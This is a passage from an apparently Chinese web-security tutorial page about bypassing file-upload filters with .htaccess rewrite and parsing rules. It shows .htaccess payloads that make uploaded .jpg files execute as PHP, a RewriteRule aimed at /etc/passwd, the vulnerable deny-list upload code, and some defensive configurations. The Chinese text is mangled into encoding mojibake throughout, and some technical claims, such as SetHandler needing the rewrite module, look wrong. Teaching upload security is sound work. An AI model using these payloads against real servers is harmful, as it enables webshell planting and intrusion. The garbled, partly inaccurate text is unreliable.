è®¾ç½®ä¸Šä¼ çŠ¶æ€ä¸ºtrue</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>; <span class="comment">// è®¾ç½®é”™è¯¯æ¶ˆæ¯</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>move_uploaded_file($temp_file, $img_path)</code>ï¼šå°†ä¸´æ—¶æ–‡ä»¶ä»<code>$temp_file</code>ç§»åŠ¨åˆ°ç›®æ ‡è·¯å¾„<code>$img_path</code>ã€‚</li><li>å¦‚æœç§»åŠ¨æˆåŠŸï¼Œè®¾ç½®<code>$is_upload</code>ä¸º<code>true</code>ï¼Œè¡¨ç¤ºä¸Šä¼ æˆåŠŸï¼›å¦åˆ™ï¼Œè®¾ç½®é”™è¯¯æ¶ˆæ¯ä¸ºâ€œä¸Šä¼ å‡ºé”™ï¼â€ã€‚</li></ul><h4 id="10-å¤„ç†æ‰©å±•ååœ¨ç¦æ­¢åˆ—è¡¨ä¸­çš„æƒ…å†µ"><a href="#10-å¤„ç†æ‰©å±•ååœ¨ç¦æ­¢åˆ—è¡¨ä¸­çš„æƒ…å†µ" class="headerlink" title="10. å¤„ç†æ‰©å±•ååœ¨ç¦æ­¢åˆ—è¡¨ä¸­çš„æƒ…å†µ"></a>10. å¤„ç†æ‰©å±•ååœ¨ç¦æ­¢åˆ—è¡¨ä¸­çš„æƒ…å†µ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;ä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>å¦‚æœæ–‡ä»¶æ‰©å±•ååœ¨ç¦æ­¢åˆ—è¡¨ä¸­ï¼Œè®¾ç½®é”™è¯¯æ¶ˆæ¯ä¸ºâ€œä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼â€ã€‚</li></ul><h4 id="11-å¤„ç†ä¸Šä¼ ç›®å½•ä¸å­˜åœ¨çš„æƒ…å†µ"><a href="#11-å¤„ç†ä¸Šä¼ ç›®å½•ä¸å­˜åœ¨çš„æƒ…å†µ" class="headerlink" title="11. å¤„ç†ä¸Šä¼ ç›®å½•ä¸å­˜åœ¨çš„æƒ…å†µ"></a>11. å¤„ç†ä¸Šä¼ ç›®å½•ä¸å­˜åœ¨çš„æƒ…å†µ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>å¦‚æœä¸Šä¼ ç›®å½•<code>UPLOAD_PATH</code>ä¸å­˜åœ¨ï¼Œè®¾ç½®é”™è¯¯æ¶ˆæ¯ä¸ºâ€œæ–‡ä»¶å¤¹ä¸å­˜åœ¨ï¼Œè¯·æ‰‹å·¥åˆ›å»ºï¼â€ã€‚</li></ul><h2 id="2-5-6-htaccess-é‡å†™è§£æç»•è¿‡ä¸Šä¼ "><a href="#2-5-6-htaccess-é‡å†™è§£æç»•è¿‡ä¸Šä¼ " class="headerlink" title="2.5.6 htaccess é‡å†™è§£æç»•è¿‡ä¸Šä¼ "></a>2.5.6 htaccess é‡å†™è§£æç»•è¿‡ä¸Šä¼ </h2><h3 id="htaccess-é‡å†™è§£æç»•è¿‡æ–¹æ³•"><a href="#htaccess-é‡å†™è§£æç»•è¿‡æ–¹æ³•" class="headerlink" title="htaccess é‡å†™è§£æç»•è¿‡æ–¹æ³•"></a>htaccess é‡å†™è§£æç»•è¿‡æ–¹æ³•</h3><p>ä¸Šä¼ .htaccess åˆ°ç½‘ç«™é‡Œ.htaccess å†…å®¹æ˜¯</p><p>&lt;FilesMatch â€œjpgâ€&gt;</p><p>SetHandler application&#x2F;x-httpd-php</p></FilesMatch><p>å†ä¸Šä¼ æ¶æ„çš„ jpg åˆ°.htaccess ç›¸åŒç›®å½•é‡Œï¼Œè®¿é—®å›¾ç‰‡å³å¯è·å–æ‰§è¡Œè„šæœ¬ã€‚</p><h3 id="htaccess-é‡å†™è§£æç»•è¿‡åŸç†"><a href="#htaccess-é‡å†™è§£æç»•è¿‡åŸç†" class="headerlink" title="htaccess é‡å†™è§£æç»•è¿‡åŸç†"></a>htaccess é‡å†™è§£æç»•è¿‡åŸç†</h3><p>ä¸Šä¼ æ¨¡å—ï¼Œé»‘åå•è¿‡æ»¤äº†æ‰€æœ‰çš„èƒ½æ‰§è¡Œçš„åç¼€å,å¦‚æœå…è®¸ä¸Šä¼ .htaccessã€‚htaccess æ–‡ä»¶çš„ä½œç”¨æ˜¯ å¯ä»¥å¸®æˆ‘ä»¬å®ç°åŒ…æ‹¬ï¼šæ–‡ä»¶å¤¹å¯†ç ä¿æŠ¤ã€ç”¨æˆ·è‡ªåŠ¨é‡å®šå‘ã€è‡ªå®šä¹‰é”™è¯¯é¡µé¢ã€æ”¹å˜ä½ çš„æ–‡ä»¶æ‰©å±•åã€å°ç¦ç‰¹å®šIP åœ°å€çš„ç”¨æˆ·ã€åªå…è®¸ç‰¹å®š IP åœ°å€çš„ç”¨æˆ·ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ï¼Œä»¥åŠä½¿ç”¨å…¶ä»–æ–‡ä»¶ä½œä¸º index æ–‡ä»¶ç­‰ä¸€äº›åŠŸèƒ½ã€‚</p><p>åœ¨ htaccess é‡Œå†™å…¥ SetHandler application&#x2F;x-httpd-php åˆ™å¯ä»¥æ–‡ä»¶é‡å†™æˆ php æ–‡ä»¶ã€‚&#x3D;&#x3D;è¦ htaccess çš„è§„åˆ™ç”Ÿæ•ˆ åˆ™éœ€è¦åœ¨ apache å¼€å¯ rewrite é‡å†™æ¨¡å—&#x3D;&#x3D;ï¼Œå› ä¸º apache æ˜¯å¤šæ•°éƒ½å¼€å¯è¿™ä¸ªæ¨¡å—ï¼Œæ‰€ä»¥è§„åˆ™ä¸€èˆ¬éƒ½ç”Ÿæ•ˆ</p><p>åœ¨Webåº”ç”¨ä¸­ï¼Œ<code>.htaccess</code> æ–‡ä»¶æ˜¯ Apache HTTP æœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œç”¨äºåœ¨æœåŠ¡å™¨çš„ç‰¹å®šç›®å½•ä¸­å¯ç”¨æˆ–ç¦ç”¨æŸäº›åŠŸèƒ½ï¼Œä¾‹å¦‚é‡å†™è§„åˆ™ï¼ˆRewrite Rulesï¼‰ã€‚&#x3D;&#x3D;é€šè¿‡ <code>.htaccess</code> æ–‡ä»¶ï¼Œå¯ä»¥å¯¹è¯·æ±‚çš„ URL è¿›è¡Œé‡å†™ï¼Œä»è€Œæ”¹å˜æ–‡ä»¶çš„å®é™…è®¿é—®è·¯å¾„æˆ–è§£ææ–¹å¼ã€‚&#x3D;&#x3D;</p><h3 id="ä¸ºä»€ä¹ˆ-htaccess-é‡å†™è§£æèƒ½å¤Ÿç»•è¿‡ä¸Šä¼ é™åˆ¶ï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆ-htaccess-é‡å†™è§£æèƒ½å¤Ÿç»•è¿‡ä¸Šä¼ é™åˆ¶ï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆ .htaccess é‡å†™è§£æèƒ½å¤Ÿç»•è¿‡ä¸Šä¼ é™åˆ¶ï¼Ÿ"></a>ä¸ºä»€ä¹ˆ <code>.htaccess</code> é‡å†™è§£æèƒ½å¤Ÿç»•è¿‡ä¸Šä¼ é™åˆ¶ï¼Ÿ</h3><p>åœ¨æ–‡ä»¶ä¸Šä¼ åœºæ™¯ä¸­ï¼Œ<code>.htaccess</code> é‡å†™è§£æå¯èƒ½è¢«åˆ©ç”¨æ¥ç»•è¿‡ä¸Šä¼ é™åˆ¶çš„åŸå› ä¸»è¦æœ‰ä»¥ä¸‹å‡ ç‚¹ï¼š</p><h4 id="1-æ–‡ä»¶åå’Œè·¯å¾„çš„æ··æ·†"><a href="#1-æ–‡ä»¶åå’Œè·¯å¾„çš„æ··æ·†" class="headerlink" title="1. æ–‡ä»¶åå’Œè·¯å¾„çš„æ··æ·†"></a>1. <strong>æ–‡ä»¶åå’Œè·¯å¾„çš„æ··æ·†</strong></h4><p>è®¸å¤šæ–‡ä»¶ä¸Šä¼ é™åˆ¶æ˜¯åŸºäºæ–‡ä»¶æ‰©å±•åæˆ–æ–‡ä»¶åè¿›è¡Œçš„ã€‚ä¾‹å¦‚ï¼ŒæœåŠ¡å™¨å¯èƒ½åªå…è®¸ä¸Šä¼  <code>.jpg</code>ã€<code>.png</code> æˆ– <code>.gif</code> æ–‡ä»¶ï¼ŒåŒæ—¶ç¦æ­¢ä¸Šä¼  <code>.php</code> æ–‡ä»¶ï¼Œä»¥é˜²æ­¢æ¶æ„ä»£ç æ‰§è¡Œã€‚ç„¶è€Œï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼åˆ©ç”¨ <code>.htaccess</code> ç»•è¿‡è¿™äº›é™åˆ¶ï¼š</p><ul><li><strong>ä¸Šä¼ ä¼ªè£…æ–‡ä»¶</strong>ï¼šæ”»å‡»è€…å¯ä»¥ä¸Šä¼ ä¸€ä¸ªçœ‹ä¼¼åˆæ³•çš„æ–‡ä»¶ï¼ˆä¾‹å¦‚ <code>image.jpg</code>ï¼‰ï¼Œä½†å®é™…ä¸Šè¯¥æ–‡ä»¶åŒ…å«æ¶æ„ä»£ç ï¼ˆå¦‚ PHP ä»£ç ï¼‰ã€‚</li><li><strong>åˆ©ç”¨ <code>.htaccess</code> é‡å†™è§„åˆ™</strong>ï¼šé€šè¿‡åœ¨ä¸Šä¼ ç›®å½•ä¸­æ”¾ç½®ä¸€ä¸ª <code>.htaccess</code> æ–‡ä»¶ï¼Œæ”»å‡»è€…å¯ä»¥è®¾ç½®é‡å†™è§„åˆ™ï¼Œå°†è¯·æ±‚çš„è·¯å¾„ä»çœ‹ä¼¼æ— å®³çš„æ–‡ä»¶åï¼ˆå¦‚ <code>image.jpg</code>ï¼‰é‡å†™ä¸ºå¯æ‰§è¡Œçš„æ–‡ä»¶è·¯å¾„ï¼ˆå¦‚ <code>image.php</code>ï¼‰ã€‚ä¾‹å¦‚ï¼š<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">RewriteEngine</span> <span class="literal">On</span></span><br><span class="line"><span class="attribute">RewriteRule</span> ^image\.jpg$ image.php<span class="meta"> [L]</span></span><br></pre></td></tr></table></figure>è¿™æ ·ï¼Œå½“è®¿é—® <code>image.jpg</code> æ—¶ï¼ŒæœåŠ¡å™¨ä¼šå°†å…¶é‡å†™ä¸º <code>image.php</code>ï¼Œä»è€Œæ‰§è¡Œå…¶ä¸­çš„ PHP ä»£ç ã€‚</li></ul><h4 id="2-MIME-ç±»å‹çš„ç»•è¿‡"><a href="#2-MIME-ç±»å‹çš„ç»•è¿‡" class="headerlink" title="2. MIME ç±»å‹çš„ç»•è¿‡"></a>2. <strong>MIME ç±»å‹çš„ç»•è¿‡</strong></h4><p>æ–‡ä»¶ä¸Šä¼ é™åˆ¶é€šå¸¸ä¼šæ£€æŸ¥æ–‡ä»¶çš„ MIME ç±»å‹ï¼Œä»¥ç¡®ä¿ä¸Šä¼ çš„æ–‡ä»¶æ˜¯å®‰å…¨çš„å›¾ç‰‡æ ¼å¼ã€‚ç„¶è€Œï¼ŒMIME ç±»å‹æ£€æŸ¥å¯ä»¥è¢«ç»•è¿‡ï¼Œå› ä¸ºï¼š</p><ul><li><strong>å®¢æˆ·ç«¯ä¼ªé€ </strong>ï¼šæ”»å‡»è€…å¯ä»¥åœ¨å®¢æˆ·ç«¯ä¼ªé€  MIME ç±»å‹ï¼ˆé€šè¿‡ä¿®æ”¹ <code>$_FILES[&#39;upload_file&#39;][&#39;type&#39;]</code>ï¼‰ï¼Œä½¿å…¶çœ‹èµ·æ¥åƒæ˜¯åˆæ³•çš„å›¾ç‰‡ç±»å‹ã€‚</li><li><strong>æœåŠ¡å™¨ç«¯è§£ææ¼æ´</strong>ï¼šå³ä½¿ MIME ç±»å‹æ£€æŸ¥é€šè¿‡ï¼Œæ”»å‡»è€…ä»ç„¶å¯ä»¥é€šè¿‡ <code>.htaccess</code> é‡å†™è§„åˆ™æ”¹å˜æ–‡ä»¶çš„å®é™…è§£ææ–¹å¼ã€‚ä¾‹å¦‚ï¼Œæ”»å‡»è€…å¯ä»¥ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ <code>image.jpg</code>ï¼Œä½†æ–‡ä»¶å†…å®¹å®é™…ä¸Šæ˜¯ PHP ä»£ç ï¼Œå¹¶é€šè¿‡ <code>.htaccess</code> å°†å…¶è§£æä¸º PHP æ–‡ä»¶ã€‚</li></ul><h4 id="3-æ–‡ä»¶æ‰©å±•åçš„ç»•è¿‡"><a href="#3-æ–‡ä»¶æ‰©å±•åçš„ç»•è¿‡" class="headerlink" title="3. æ–‡ä»¶æ‰©å±•åçš„ç»•è¿‡"></a>3. <strong>æ–‡ä»¶æ‰©å±•åçš„ç»•è¿‡</strong></h4><p>å³ä½¿æœåŠ¡å™¨æ˜ç¡®ç¦æ­¢ä¸Šä¼  <code>.php</code> æ–‡ä»¶ï¼Œæ”»å‡»è€…ä»ç„¶å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼ç»•è¿‡ï¼š</p><ul><li><strong>ä¸Šä¼ ä¼ªè£…æ–‡ä»¶</strong>ï¼šä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ <code>image.jpg</code>ï¼Œä½†æ–‡ä»¶å†…å®¹åŒ…å« PHP ä»£ç ã€‚</li><li><strong>åˆ©ç”¨ <code>.htaccess</code> é‡å†™è§„åˆ™</strong>ï¼šé€šè¿‡ <code>.htaccess</code> æ–‡ä»¶ï¼Œå°†è¯·æ±‚çš„è·¯å¾„é‡å†™ä¸ºå¯æ‰§è¡Œçš„æ–‡ä»¶è·¯å¾„ã€‚ä¾‹å¦‚ï¼š<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">AddType</span> application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure>è¿™æ ·ï¼ŒæœåŠ¡å™¨ä¼šå°† <code>.jpg</code> æ–‡ä»¶è§£æä¸º PHP æ–‡ä»¶ï¼Œä»è€Œæ‰§è¡Œå…¶ä¸­çš„ä»£ç ã€‚</li></ul><h4 id="4-ç›®å½•éå†å’Œè·¯å¾„æ··æ·†"><a href="#4-ç›®å½•éå†å’Œè·¯å¾„æ··æ·†" class="headerlink" title="4. ç›®å½•éå†å’Œè·¯å¾„æ··æ·†"></a>4. <strong>ç›®å½•éå†å’Œè·¯å¾„æ··æ·†</strong></h4><p>æ”»å‡»è€…å¯ä»¥é€šè¿‡ <code>.htaccess</code> æ–‡ä»¶ä¸­çš„é‡å†™è§„åˆ™ï¼Œå°†è¯·æ±‚è·¯å¾„é‡å†™ä¸ºå…¶ä»–ç›®å½•ä¸­çš„æ–‡ä»¶ï¼Œä»è€Œç»•è¿‡ä¸Šä¼ ç›®å½•çš„é™åˆ¶ã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">RewriteEngine</span> <span class="literal">On</span></span><br><span class="line"><span class="attribute">RewriteRule</span> ^image\.jpg$ ../../../../../../etc/passwd<span class="meta"> [L]</span></span><br></pre></td></tr></table></figure><p>è¿™æ ·ï¼Œè®¿é—® <code>image.jpg</code> æ—¶ï¼ŒæœåŠ¡å™¨ä¼šå°è¯•è®¿é—® <code>/etc/passwd</code> æ–‡ä»¶ï¼Œä»è€Œå¯¼è‡´è·¯å¾„éå†æ”»å‡»ã€‚</p><h3 id="å¦‚ä½•é˜²æ­¢-htaccess-é‡å†™è§£æç»•è¿‡ä¸Šä¼ é™åˆ¶ï¼Ÿ"><a href="#å¦‚ä½•é˜²æ­¢-htaccess-é‡å†™è§£æç»•è¿‡ä¸Šä¼ é™åˆ¶ï¼Ÿ" class="headerlink" title="å¦‚ä½•é˜²æ­¢ .htaccess é‡å†™è§£æç»•è¿‡ä¸Šä¼ é™åˆ¶ï¼Ÿ"></a>å¦‚ä½•é˜²æ­¢ <code>.htaccess</code> é‡å†™è§£æç»•è¿‡ä¸Šä¼ é™åˆ¶ï¼Ÿ</h3><p>ä¸ºäº†é˜²æ­¢ <code>.htaccess</code> é‡å†™è§£æç»•è¿‡ä¸Šä¼ é™åˆ¶ï¼Œå¯ä»¥é‡‡å–ä»¥ä¸‹æªæ–½ï¼š</p><h4 id="1-ç¦ç”¨-htaccess-æ–‡ä»¶"><a href="#1-ç¦ç”¨-htaccess-æ–‡ä»¶" class="headerlink" title="1. ç¦ç”¨ .htaccess æ–‡ä»¶"></a>1. <strong>ç¦ç”¨ <code>.htaccess</code> æ–‡ä»¶</strong></h4><ul><li>å¦‚æœä¸éœ€è¦ä½¿ç”¨ <code>.htaccess</code> æ–‡ä»¶ï¼Œå¯ä»¥åœ¨æœåŠ¡å™¨é…ç½®ä¸­ç¦ç”¨å®ƒã€‚ä¾‹å¦‚ï¼Œåœ¨ Apache é…ç½®æ–‡ä»¶ä¸­è®¾ç½®ï¼š<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="section">&lt;Directory <span class="string">&quot;/var/www/html&quot;</span>&gt;</span></span><br><span class="line">    <span class="attribute">AllowOverride</span> None</span><br><span class="line"><span class="section">&lt;/Directory&gt;</span></span><br></pre></td></tr></table></figure>è¿™æ ·ï¼Œ<code>.htaccess</code> æ–‡ä»¶å°†ä¸ä¼šè¢«è§£æï¼Œä»è€Œé˜²æ­¢æ”»å‡»è€…åˆ©ç”¨å®ƒè¿›è¡Œé‡å†™ã€‚</li></ul><h4 id="2-ä¸¥æ ¼æ£€æŸ¥æ–‡ä»¶å†…å®¹"><a href="#2-ä¸¥æ ¼æ£€æŸ¥æ–‡ä»¶å†…å®¹" class="headerlink" title="2. ä¸¥æ ¼æ£€æŸ¥æ–‡ä»¶å†…å®¹"></a>2. <strong>ä¸¥æ ¼æ£€æŸ¥æ–‡ä»¶å†…å®¹</strong></h4><ul><li>ä¸ä»…è¦æ£€æŸ¥æ–‡ä»¶æ‰©å±•åå’Œ MIME ç±»å‹ï¼Œè¿˜è¦æ£€æŸ¥æ–‡ä»¶çš„å®é™…å†…å®¹ã€‚ä¾‹å¦‚ï¼Œä½¿ç”¨ <code>finfo_file()</code> å‡½æ•°æ£€æŸ¥æ–‡ä»¶çš„å®é™… MIME ç±»å‹ï¼š<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$finfo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">finfo</span>(FILEINFO_MIME_TYPE);</span><br><span class="line"><span class="variable">$mime_type</span> = <span class="variable">$finfo</span>-&gt;<span class="title function_ invoke__">file</span>(<span class="variable">$temp_file</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$mime_type</span> != <span class="string">&#x27;image/jpeg&#x27;</span> &amp;&amp; <span class="variable">$mime_type</span> != <span class="string">&#x27;image/png&#x27;</span> &amp;&amp; <span class="variable">$mime_type</span> != <span class="string">&#x27;image/gif&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;æ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼Œè¯·é‡æ–°ä¸Šä¼ ï¼&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="3-é™åˆ¶æ–‡ä»¶åå’Œè·¯å¾„"><a href="#3-é™åˆ¶æ–‡ä»¶åå’Œè·¯å¾„" class="headerlink" title="3. é™åˆ¶æ–‡ä»¶åå’Œè·¯å¾„"></a>3. <strong>é™åˆ¶æ–‡ä»¶åå’Œè·¯å¾„</strong></h4><ul><li>å¯¹æ–‡ä»¶åè¿›è¡Œæ¸…ç†ï¼Œå»é™¤ç‰¹æ®Šå­—ç¬¦ï¼Œå¹¶ç”Ÿæˆå®‰å…¨çš„æ–‡ä»¶åï¼š<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^a-zA-Z0-9_.-]/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_name</span>);</span><br></pre></td></tr></table></figure></li><li>ä½¿ç”¨éšæœºæ–‡ä»¶åé¿å…æ–‡ä»¶è¢«è¦†ç›–ï¼š<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">uniqid</span>() . <span class="string">&#x27;_&#x27;</span> . <span class="variable">$file_name</span>;</span><br></pre></td></tr></table></figure></li></ul><h4 id="4-é™åˆ¶ä¸Šä¼ ç›®å½•çš„æƒé™"><a href="#4-é™åˆ¶ä¸Šä¼ ç›®å½•çš„æƒé™" class="headerlink" title="4. é™åˆ¶ä¸Šä¼ ç›®å½•çš„æƒé™"></a>4. <strong>é™åˆ¶ä¸Šä¼ ç›®å½•çš„æƒé™</strong></h4><ul><li>ç¡®ä¿ä¸Šä¼ ç›®å½•çš„æƒé™æ­£ç¡®è®¾ç½®ï¼Œä»…å…è®¸è„šæœ¬å†™å…¥ï¼Œé˜²æ­¢æœªç»æˆæƒçš„è®¿é—®ã€‚</li><li>ç¦æ­¢åœ¨ä¸Šä¼ ç›®å½•ä¸­æ‰§è¡Œè„šæœ¬ï¼š<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="section">&lt;Directory <span class="string">&quot;/var/www/html/uploads&quot;</span>&gt;</span></span><br><span class="line">    <span class="attribute">php_flag</span> engine <span class="literal">off</span></span><br><span class="line"><span class="section">&lt;/Directory&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="5-æ—¥å¿—è®°å½•å’Œç›‘æ§"><a href="#5-æ—¥å¿—è®°å½•å’Œç›‘æ§" class="headerlink" title="5. æ—¥å¿—è®°å½•å’Œç›‘æ§"></a>5. <strong>æ—¥å¿—è®°å½•å’Œç›‘æ§</strong></h4><ul><li>è®°å½•ä¸Šä¼ æ“ä½œçš„æ—¥å¿—ï¼Œä¾¿äºåç»­å®¡è®¡å’Œæ’æŸ¥é—®é¢˜ã€‚</li><li>ç›‘æ§ä¸Šä¼ ç›®å½•çš„å¼‚å¸¸è®¿é—®è¡Œä¸ºï¼ŒåŠæ—¶å‘ç°æ½œåœ¨çš„å®‰å…¨å¨èƒã€‚</li></ul><h3 id="æ€»ç»“-2"><a href="#æ€»ç»“-2" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p><code>.htaccess</code> é‡å†™è§£æèƒ½å¤Ÿç»•è¿‡ä¸Šä¼ é™åˆ¶çš„åŸå› ä¸»è¦æ˜¯æ”»å‡»è€…å¯ä»¥é€šè¿‡å®ƒæ”¹å˜æ–‡ä»¶çš„å®é™…è§£ææ–¹å¼æˆ–è·¯å¾„ã€‚é€šè¿‡ç¦ç”¨ <code>.htaccess</code> æ–‡ä»¶ã€ä¸¥æ ¼æ£€æŸ¥æ–‡ä»¶å†…å®¹ã€é™åˆ¶æ–‡ä»¶åå’Œè·¯å¾„ã€è®¾ç½®ä¸Šä¼ ç›®å½•æƒé™ä»¥åŠè®°å½•æ—¥å¿—ï¼Œå¯ä»¥æœ‰æ•ˆé˜²æ­¢æ­¤ç±»æ”»å‡»ã€‚</p><h3 id="htaccess-é‡å†™è§£æç»•è¿‡ä»£ç åˆ†æ"><a href="#htaccess-é‡å†™è§£æç»•è¿‡ä»£ç åˆ†æ" class="headerlink" title="htaccess é‡å†™è§£æç»•è¿‡ä»£ç åˆ†æ"></a>htaccess é‡å†™è§£æç»•è¿‡ä»£ç åˆ†æ</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//æ”¶å°¾å»ç©º</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span 